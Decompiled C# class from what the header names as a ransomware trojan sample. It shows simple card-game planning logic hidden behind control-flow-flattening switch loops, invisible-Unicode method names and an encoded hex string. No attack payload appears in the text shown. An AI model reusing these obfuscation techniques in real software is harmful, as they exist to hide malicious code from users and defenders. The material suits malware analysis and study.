// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: cDisplayClass1, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 0E93EC79-9513-4BD1-8651-98C7CADA4D7F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-a7264014555068294029d5d9ceb9ee717c4d2bf523330c30cee18f18e55a0b5b.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -1832189011;
      string str1;
      bool flag;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1868160443)) % 14U)
        {
          case 0:
            num1 = (int) num2 * -337577970 ^ 259542697;
            continue;
          case 1:
            num1 = (int) num2 * -753464548 ^ -274963431;
            continue;
          case 2:
            int num3;
            num1 = num3 = BaseStream != 1 ? -7701227 : (num3 = -1784449225);
            continue;
          case 3:
            num1 = (int) num2 * 1186236912 ^ 872569040;
            continue;
          case 4:
            flag = BaseStream == 0;
            num1 = (int) num2 * 1342806722 ^ 2063106764;
            continue;
          case 5:
            goto label_1;
          case 6:
            str1 = "51793631";
            num1 = (int) num2 * -710095702 ^ -93530315;
            continue;
          case 7:
            num1 = (int) num2 * -648263713 ^ -787671284;
            continue;
          case 8:
            str2 = str1;
            num1 = -1942042734;
            continue;
          case 9:
            str1 = "5461736B577261707065724173796E6352657375";
            num1 = (int) num2 * 1958124680 ^ -1510253520;
            continue;
          case 10:
            str1 = (string) null;
            num1 = (int) num2 * -592989327 ^ 1253486839;
            continue;
          case 11:
            num1 = (int) num2 * -184170224 ^ 989361900;
            continue;
          case 13:
            int num4 = !flag ? -60343441 : (num4 = -1967199708);
            num1 = num4 ^ (int) num2 * 461344864;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = -262985182;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ -801000355)) % 3U)
      {
        case 0:
          goto label_1;
        case 2:
          num4 = 0;
          goto label_5;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = -1384818572;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
        int[] planningCards = this.PlanningCards;
        int index = 0;
label_1:
        int num2 = 1838196141;
        int planningCardsCount;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num2 ^ 296172638)) % 10U)
          {
            case 0:
              num2 = 894259170;
              continue;
            case 1:
              int num4;
              num2 = num4 = planningCards[index] <= 0 ? 171793034 : (num4 = 848230076);
              continue;
            case 2:
              num2 = (int) num3 * 1804311851 ^ 1274172577;
              continue;
            case 3:
              int num5;
              num2 = num5 = index >= planningCards.Length ? 1104101771 : (num5 = 1517915055);
              continue;
            case 4:
              ++num1;
              num2 = (int) num3 * -1594358742 ^ 1019972510;
              continue;
            case 5:
              num2 = (int) num3 * 942351730 ^ 2123151501;
              continue;
            case 6:
              goto label_1;
            case 7:
              planningCardsCount = num1;
              num2 = (int) num3 * 1691017316 ^ 1516362844;
              continue;
            case 8:
              ++index;
              num2 = (int) num3 * -1750884073 ^ 2077406303;
              continue;
            default:
              goto label_11;
          }
        }
label_11:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = -403801905;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1984537657)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 314322280 ^ 398466442;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
label_1:
      int num1 = -1898693059;
      int index;
      int planningCard;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2007593646)) % 10U)
        {
          case 0:
            int num3;
            num1 = num3 = index >= this.PlanningCards.Length ? -1475020453 : (num3 = -421115844);
            continue;
          case 1:
            index = 0;
            num1 = (int) num2 * 742242947 ^ -1311114593;
            continue;
          case 2:
            num1 = (int) num2 * 148767983 ^ 907332707;
            continue;
          case 3:
            str2 = str1;
            num1 = (int) num2 * -1133279718 ^ 1648477704;
            continue;
          case 4:
            str1 = Player.\u200B⁭‏⁪⁫​⁪‪⁮‍⁭‎‬⁬​⁪‫‌⁬‫‪‪​⁪‬⁮‬⁮⁭‏‌⁫‫‪‮‭‮‪‏‬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1140893721;
            continue;
          case 5:
            goto label_1;
          case 6:
            num1 = (int) num2 * 112702020 ^ 141478103;
            continue;
          case 8:
            planningCard = this.PlanningCards[index];
            int num4;
            num1 = num4 = planningCard == 0 ? -199144978 : (num4 = -667582550);
            continue;
          case 9:
            ++index;
            num1 = -1855287982;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
      Player player = new Player()
      {
        Name = json["name"].Value,
        PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
        UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
      };
label_1:
      int num1 = 1979727432;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 902020153)) % 3U)
        {
          case 1:
            num1 = (int) num2 * -695966417 ^ 1146093768;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 1785997604;
      int aIndex;
      int count;
      bool flag;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1215098973)) % 10U)
        {
          case 0:
            flag = aIndex < count;
            num1 = 1483575077;
            continue;
          case 1:
            count = json.Count;
            numArray = new int[count];
            num1 = (int) num2 * 1264826538 ^ 1840986556;
            continue;
          case 2:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 2087798024;
            continue;
          case 3:
            planningCards = numArray;
            num1 = (int) num2 * -625265815 ^ 1645330090;
            continue;
          case 4:
            int num3 = !flag ? -125929294 : (num3 = -1840953905);
            num1 = num3 ^ (int) num2 * -1290571762;
            continue;
          case 5:
            aIndex = 0;
            num1 = (int) num2 * -260726030 ^ 1043413652;
            continue;
          case 7:
            ++aIndex;
            num1 = (int) num2 * -1229180879 ^ 54235700;
            continue;
          case 8:
            goto label_1;
          case 9:
            num1 = (int) num2 * -1512972500 ^ 1198501093;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1688345649;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -102780894)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            str = Player.\u202C​‍‏‮‌‎‮‮⁪‎⁮⁬⁬⁯‎‏⁯⁫‎​‮‫‍⁫⁮‎‌‍‪‎‬‬‪‫‪‬‍‍⁭‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 323468830 ^ -631247142;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u200B⁭‏⁪⁫​⁪‪⁮‍⁭‎‬⁬​⁪‫‌⁬‫‪‪​⁪‬⁮‬⁮⁭‏‌⁫‫‪‮‭‮‪‏‬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202C​‍‏‮‌‎‮‮⁪‎⁮⁬⁬⁯‎‏⁯⁫‎​‮‫‍⁫⁮‎‌‍‪‎‬‬‪‫‪‬‍‍⁭‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
